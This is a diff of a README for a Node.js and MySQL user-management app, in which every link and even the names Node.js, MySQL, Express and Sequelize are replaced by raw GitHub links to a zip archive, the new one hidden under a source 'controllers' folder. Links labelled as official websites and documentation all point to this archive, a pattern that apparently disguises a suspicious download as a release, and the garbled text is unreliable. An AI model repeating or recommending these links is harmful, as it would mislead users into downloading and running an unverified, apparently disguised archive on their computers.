@@ -10,22 +10,22 @@ If you want to run this application on your computer, follow the steps below.
 
 To get started, visit the page below to download the latest version of the application.
 
-[Download Here](https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip)
+[Download Here](https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip)
 
 ### 📋 System Requirements
 
 Before you download, ensure your system meets these requirements:
 
 - **Operating System:** Windows 10, macOS, or a supported Linux distribution.
-- **https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip** Version 14 or later should be installed.
+- **https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip** Version 14 or later should be installed.
 - **MySQL:** Ensure MySQL server is running and accessible.
 
-If you haven't installed https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip or MySQL, you can find installation guides on their official websites.
+If you haven't installed https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip or MySQL, you can find installation guides on their official websites.
 
 ## 🔧 Installation Instructions
 
 1. **Download the Latest Release:**
-   Visit the [Releases page](https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip) to select the latest release. 
+   Visit the [Releases page](https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip) to select the latest release. 
 
 2. **Extract the Files:**
    After downloading, locate the file in your "Downloads" folder. Right-click and choose "Extract" or "Unzip" to view the application files.
@@ -79,7 +79,7 @@ This application provides several features to help manage users:
 
 This project uses:
 
-- **https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip** The JavaScript runtime for server-side logic.
+- **https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip** The JavaScript runtime for server-side logic.
 - **Express:** A web framework for handling HTTP requests.
 - **Sequelize:** An ORM for easy database interaction.
 - **MySQL:** The database for storing user information.
@@ -90,9 +90,9 @@ If you encounter any issues while running the application, or if you have questi
 
 ## 🔗 Useful Resources
 
-- [https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip Official Website](https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip)
-- [MySQL Official Website](https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip)
-- [Express Documentation](https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip)
-- [Sequelize Documentation](https://raw.githubusercontent.com/wingbbx/nodejs-session-2/main/stepsire/nodejs-session-2.zip)
+- [https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip Official Website](https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip)
+- [MySQL Official Website](https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip)
+- [Express Documentation](https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip)
+- [Sequelize Documentation](https://github.com/wingbbx/nodejs-session-2/raw/refs/heads/main/src/controllers/session-nodejs-1.8.zip)
 
 Thank you for using "nodejs-session-2." We hope you find it helpful for managing user data efficiently!
